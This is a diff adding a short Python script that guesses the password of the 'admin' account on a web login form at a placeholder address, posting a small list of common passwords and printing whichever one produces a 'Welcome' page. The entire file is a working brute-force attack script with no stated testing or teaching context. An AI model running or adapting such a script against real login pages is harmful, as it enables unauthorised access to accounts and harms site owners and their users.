@@ -1,0 +1,15 @@
+import requests
+
+url = "http://example.com/login"
+username = "admin"
+
+passwords = ["1234", "admin", "password", "123456"]
+
+for password in passwords:
+    data = {"username": username, "password": password}
+
+    response = requests.post(url, data=data)
+
+    if "Welcome" in response.text:
+        print(f"[+] Password Found: {password}")
+        break
